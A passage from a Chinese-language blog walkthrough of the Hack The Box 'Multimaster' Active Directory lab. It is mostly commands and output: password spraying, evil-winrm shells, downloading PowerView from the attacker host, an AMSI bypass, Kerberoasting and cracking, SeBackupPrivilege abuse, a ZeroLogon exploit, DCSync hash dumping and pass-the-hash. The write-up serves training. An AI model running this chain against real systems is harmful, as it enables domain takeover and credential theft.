<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\inetpub\wwwroot\bin&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 7B4A-4B5F<br><br> Directory of C:\inetpub\wwwroot\bin<br><br>01/07/2020  09:28 PM    &lt;DIR&gt;          .<br>01/07/2020  09:28 PM    &lt;DIR&gt;          ..<br>02/21/2013  07:13 PM           102,912 Antlr3.Runtime.dll<br>02/21/2013  07:13 PM           431,616 Antlr3.Runtime.pdb<br>05/24/2018  12:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll<br>07/24/2012  10:18 PM            45,416 Microsoft.Web.Infrastructure.dll<br>01/09/2020  04:13 AM            13,824 MultimasterAPI.dll<br>01/09/2020  04:13 AM            28,160 MultimasterAPI.pdb<br>02/17/2018  08:14 PM           664,576 Newtonsoft.Json.dll<br>01/07/2020  09:28 PM    &lt;DIR&gt;          roslyn<br>11/27/2018  11:30 PM           178,808 System.Net.Http.Formatting.dll<br>11/27/2018  11:28 PM            27,768 System.Web.Cors.dll<br>01/27/2015  02:34 PM           139,976 System.Web.Helpers.dll<br>11/27/2018  11:31 PM            39,352 System.Web.Http.Cors.dll<br>11/27/2018  11:31 PM           455,096 System.Web.Http.dll<br>01/31/2018  10:49 PM            77,520 System.Web.Http.WebHost.dll<br>01/27/2015  02:32 PM           566,472 System.Web.Mvc.dll<br>02/11/2014  01:56 AM            70,864 System.Web.Optimization.dll<br>01/27/2015  02:32 PM           272,072 System.Web.Razor.dll<br>01/27/2015  02:34 PM            41,672 System.Web.WebPages.Deployment.dll<br>01/27/2015  02:34 PM           211,656 System.Web.WebPages.dll<br>01/27/2015  02:34 PM            39,624 System.Web.WebPages.Razor.dll<br>07/17/2013  03:33 AM         1,276,568 WebGrease.dll<br>              20 File(s)      4,724,032 bytes<br>               3 Dir(s)   6,643,183,616 bytes free<br><br>C:\inetpub\wwwroot\bin&gt;copy MultimasterAPI.dll \\10.10.16.15      <br></code></pre></td></tr></table></figure>

<p>在该dll有另一个密码。</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223102706425.png" srcset="/img/loading.gif" lazyload alt="image-20221223102706425"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs passwd">D3veL0pM3nT!<br></code></pre></td></tr></table></figure>

<p>然后接着进行喷射：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec winrm 10.10.10.179 -u user -p <span class="hljs-string">&#x27;D3veL0pM3nT!&#x27;</span> --continue-on-success | grep [+]<br>WINRM                    10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! (Pwn3d!)<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ evil-winrm -u <span class="hljs-string">&quot;MEGACORP\sbauer&quot;</span> -p <span class="hljs-string">&#x27;D3veL0pM3nT!&#x27;</span> -i 10.10.10.179<br><br>Evil-WinRM shell v3.4<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\sbauer\Documents&gt; <span class="hljs-built_in">whoami</span> /all<br><br>USER INFORMATION<br>----------------<br></code></pre></td></tr></table></figure>

<h3 id="Get-Jorden-Shell"><a href="#Get-Jorden-Shell" class="headerlink" title="Get Jorden Shell:"></a>Get Jorden Shell:</h3><p>sbauer有一个一级控制对象：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223103301941.png" srcset="/img/loading.gif" lazyload alt="image-20221223103301941"></p>
<p>这个JORDEN用户是SERVER OPERATORS组的，这是Active Directory默认存在的组，这个组的权限很大。我可以使用SBAUER用户的权限给JORDEN用户设置个SPN，需要借助PowerVIew:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; wget http://10.10.16.15/PowerView.ps1 -O PowerView.ps1<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; . .\PowerView.ps1<br>At C:\Users\sbauer\desktop\PowerView.ps1:1 char:1<br>+ <span class="hljs-comment">#requires -version 2</span><br>+ ~~~~~~~~~~~~~~~~~~~~<br>This script contains malicious content and has been blocked by your antivirus software.<br>At C:\Users\sbauer\desktop\PowerView.ps1:1 char:1<br>+ <span class="hljs-comment">#requires -version 2</span><br>+ ~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : ParserError: (:) [], ParseException<br>    + FullyQualifiedErrorId : ScriptContainedMaliciousContent<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; Bypass-4MSI<br><br>Info: Patching 4MSI, please be patient...<br><br>[+] Success!<br></code></pre></td></tr></table></figure>

<p>先创建一组凭据对象：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; . .\PowerView.ps1<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; <span class="hljs-variable">$SecPassword</span> = ConvertTo-SecureString <span class="hljs-string">&#x27;D3veL0pM3nT!&#x27;</span> -AsPlainText -Force<br>*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; <span class="hljs-variable">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;MEGACORP\sbauer&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br></code></pre></td></tr></table></figure>

<p>然后用这组凭据对象去和域控认证为jorden设置SPN：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; Set-DomainObject -Credential <span class="hljs-variable">$Cred</span> -Identity jorden -SET @&#123;serviceprincipalname=<span class="hljs-string">&#x27;nonexistent/BLAHBLAH&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<p>设置完后可以尝试请求该SPN票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\sbauer\desktop&gt; Get-DomainSPNTicket -Credential <span class="hljs-variable">$Cred</span> <span class="hljs-string">&#x27;nonexistent/BLAHBLAH&#x27;</span> | fl<br>Warning: [Invoke-UserImpersonation] powershell.exe is not currently <span class="hljs-keyword">in</span> a single-threaded apartment state, token impersonation may not work.<br>Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: MEGACORP\sbauer<br><br><br>SamAccountName       : UNKNOWN<br>DistinguishedName    : UNKNOWN<br>ServicePrincipalName : nonexistent/BLAHBLAH<br>TicketByteHexStream  :<br>Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN<span class="hljs-variable">$nonexistent</span>/BLAHBLAH*$0A972DA54CC4457B3574CD4F751F9455<span class="hljs-variable">$7933C5A710ECDD7D23820210FCFA7A6CDDD2D38369F6249F31C58C1760AE6559D250E92B801E6C378AAAD168349D69E2BD16DB73D0241286DFD4C808DB6413D261855B31456558</span><br>                       9EE2EED35D2728175575273CE97C6C09E1DC963C3A2441BD0AA9D612583B989B95C7C496582E5D28A3632D9217AB3C43E9E612B63E62652ECD809E418400CD4D8CDE688A9811B4F9FDE77AC4FAAF781BFE6480F96DD07103E597C90F1B40BE0B23DDE90B091EE9A27175D0C0E016F483E9<br>                       A22705461E0852235F01E6AFC4915DD29825FA25E8CF3E72C3CD103D72E966D74AEBE9825508C77B46C86B26F9706CE49D9E44FE161535DBBB2634EBCA1A4E07993B3CB6D78FDFB1CC94F6FE386075DDA185F026338E4278F006FCCD2E7C7DEEE8B14D06BA0DBAE52E10BC65369246B197<br>                       7B50593664829373525660EDE1D2667DDAEF0F65FA7122C32D6C019C925E23FD33E4162E5F3AC19E8649E1B16272CA939C14960A8AB4EA7F7B5EB4B33F82519E5EF3360AAEA35EA3E297088C9A63C8FB6EE249AB6790A7E9EAA5BAFA373E68ABDE108BB31794B22A6E730D0B85309E4B4F<br>                       DAEAF29A976B1A7A46AED3699FEB70A1FD5BA63E8D57587177F299F41F9F318F92A2E2D096535496ED6F10DD0F0F97F06A711814412D093B5818A2B70D92CC788E071BDAD2870D044FC8BA38EE9516E7915D4C9A8CD1561EF39B3ABF65555B51E52196DEE6283754B8243BF914CA97B2B7<br>                       A0252B46F759028EB5240044D90877CFE4BC9D983F88BE08E0FF1C6AFE04BEF0389816935E82AD506DA0A844BC56139ED95C51E329711B89B2B03CCDC5A7618EF1A792F5FDAC3BD2019C7B035EBE20EAB724698E4C871F60757B96370EF3A48A1D1CD18515201216EDEA2BCC9D2E5E4A8D<br>                       7A60E53D4D51A4EBCE818CE43500A112DDF8BD5E58669838961D59D2FE37061714E237C436E476F22007A242F1D225ACAA544CED847B27923A152921DE06AF0DD48D4659F33BFDFEE17511B66D5A230AFA9CD2751831B0FDF0B2DD6216874F24CDC62A4E6F6B469AED73B005C5D038C64B<br>                       4A309DB7E1E37AF56C6CAFE4F1FCA8AF77A9751A9AB04F144697CAC6189B143306F950B2742C6FDCD6878DF3A7081EF9D5BF67632C5DCA52D92103466543A3467B2AB44358625D3BB0C5747D35A625BC9ABB70A11140CF1775C60A1468C4EEC5AED3064ECCCEDF59067413A4351DFCBB40<br>                       2CA732DA75C99FB8C2ACD48719A0696A88C8C581799A3105EA9A13F7EB956CA4F8B93C10DBD01EDDFC4C2A0D9DE05E54E963301F713A4BA8D6772A0FC71349A973DF9C1CE4695E78FD493A2574F33CC1DE70631E73BEB0A88F2CB136953A804AB5FA7F7287155660AB0987F58CC6986B79<br>                       BB63D9CB80A8EB0C1F8CC1ADD255C6CBE6DA039BE7CF1BD19FF39CA9FA678A9576B8851EBDED283B5A8D7CB59E44964FC45C419B241F404716E9848A7DA2925758C6396C3438E0EBCECDE9227D9022AC42EE4AFDA7363F105930A3716F172299172B2D998591303C<br><br>Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle<br></code></pre></td></tr></table></figure>

<p>可以从中破解密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ hashcat -h | grep 18200<br>  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol<br>                                                                                                                                             <br>Archlinux:~/HackTheBox$ hashcat -a 0 -m 18200 ticket /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1  Linux, Release, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>======================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-AMD Ryzen 7 6800H with Radeon Graphics, 14349/28763 MB (4096 MB allocatable), 16MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashfile <span class="hljs-string">&#x27;ticket&#x27;</span> on line 1 (<span class="hljs-variable">$krb5t</span>...5930A3716F172299172B2D998591303C): Separator unmatched<br>No hashes loaded.<br><br>Started: Fri Dec 23 11:35:05 2022<br>Stopped: Fri Dec 23 11:35:05 2022<br></code></pre></td></tr></table></figure>

<p>hashcat对格式非常非常严谨或许我们复制错了也说不定，但是john每次读取哈希并不会很精准但往往总是能意外的破解出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ john ticket -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <br>--------------------------------------------------------------------------<br>The library attempted to open the following supporting CUDA libraries,<br>but each of them failed.  CUDA-aware support is disabled.<br>libcuda.so.1: cannot open shared object file: No such file or directory<br>libcuda.dylib: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory<br>If you are not interested <span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> run with<br>--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested<br><span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> try setting LD_LIBRARY_PATH to the location<br>of libcuda.so.1 to get passed this issue.<br>--------------------------------------------------------------------------<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])<br>Will run 16 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>rainforest786    (?)<br>1g 0:00:00:00 DONE (2022-12-23 11:34) 1.612g/s 7101Kp/s 7101Kc/s 7101KC/s rajalacy..raileys<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure>

<p>然后登陆winrm：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Archlinux:~/HackTheBox<span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;MEGACORP\jorden&quot;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;rainforest786&#x27;</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">4</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\jorden\Documents&gt; whoami<br>megacorp\jorden<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\jorden\Documents&gt; <br></code></pre></td></tr></table></figure>

<h3 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag:"></a>Get Flag:</h3><p>jorden有备份权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\jorden\Documents&gt; <span class="hljs-built_in">whoami</span> /all<br>.......................................................<br><br>Privilege Name                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     Add workstations to domain          Enabled<br>SeSystemtimePrivilege         Change the system time              Enabled<br>SeBackupPrivilege             Back up files and directories       Enabled<br>SeRestorePrivilege            Restore files and directories       Enabled<br>SeShutdownPrivilege           Shut down the system                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>      Enabled<br>SeTimeZonePrivilege           Change the time zone                Enabled<br><br></code></pre></td></tr></table></figure>

<p>SeBackupPrivilege 可以备份任何系统文件，可以滥用去读取任何文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\jorden\Documents&gt; robocopy /b C:\<span class="hljs-built_in">users</span>\administrator\desktop C:\programdata\temp<br><br>-------------------------------------------------------------------------------<br>   ROBOCOPY     ::     Robust File Copy <span class="hljs-keyword">for</span> Windowss<br>-------------------------------------------------------------------------------<br><br>  Started : Thursday, December 22, 2022 7:47:37 PM<br>   Source : C:\<span class="hljs-built_in">users</span>\administrator\desktop\<br>     Dest : C:\programdata\temp\<br><br>    Files : *.*<br><br>  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30<br><br>------------------------------------------------------------------------------<br><br>          New Dir          2    C:\<span class="hljs-built_in">users</span>\administrator\desktop\<br>            New File                 488        desktop.ini<br>  0%<br>100%<br>            New File                  34        root.txt<br>  0%<br>100%<br><br>------------------------------------------------------------------------------<br><br>               Total    Copied   Skipped  Mismatch    FAILED    Extras<br>    Dirs :         1         1         0         0         0         0<br>   Files :         2         2         0         0         0         0<br>   Bytes :       522       522         0         0         0         0<br>   Times :   0:00:00   0:00:00                       0:00:00   0:00:00<br>   Ended : Thursday, December 22, 2022 7:47:37 PM<br><br>*Evil-WinRM* PS C:\Users\jorden\Documents&gt; <span class="hljs-built_in">type</span> C:\programdata\temp\root.txt<br>9c5d1............................................<br></code></pre></td></tr></table></figure>

<h3 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon:"></a>ZeroLogon:</h3><p>漏洞文章：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.anquanke.com/post/id/219374<br></code></pre></td></tr></table></figure>

<p>漏洞利用脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/dirkjanm/CVE-2020-1472<br></code></pre></td></tr></table></figure>

<p>先打payload将域控机器账户密码清空：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/CVE-2020-1472$ python cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179<br>Performing authentication attempts...<br>=================================================<br>Target vulnerable, changing account password to empty string<br><br>Result: 0<br><br>Exploit complete!<br></code></pre></td></tr></table></figure>

<p>然后用域控机器账户去DCSync：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/CVE-2020-1472$ secretsdump.py -no-pass -just-dc MULTIMASTER\<span class="hljs-variable">$@10</span>.10.10.179<br>Impacket v0.10.1.dev1+20221214.172823.8799a1a2 - Copyright 2022 Fortra<br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::<br>MEGACORP.LOCAL\tushikikatomo:1110:aad3b435b51404eeaad3b435b51404ee:1c9c8bfd28d000e8904f23c280b25d21:::<br>MEGACORP.LOCAL\andrew:1111:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::<br></code></pre></td></tr></table></figure>

<p>然后横向移动：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/CVE-2020-1472$ evil-winrm -i 10.10.10.179 -u administrator -H <span class="hljs-string">&#x27;69cbf4a9b7415c9e1caf93d51d971be0&#x27;</span><br><br>Evil-WinRM shell v3.4<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">whoami</span><br>megacorp\administrator<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="hljs-built_in">type</span> root.txt<br>9c5d11c8be8ec6e04777e8458094d800<br>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB Walkthrough Multimaster</div>
      <div>https://crazyinside.github.io/post/HackTheBox-Multimaster.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>World'sEnd</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/post/HackTheBox-Nunchucks.html" title="HTB Walkthrough - Nunchucks">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HTB Walkthrough - Nunchucks</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/post/HackTheBox-NodeBlog.html" title="HTB Walkthrough - NodeBlog">
                        <span class="hidden-mobile">HTB Walkthrough - NodeBlog</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
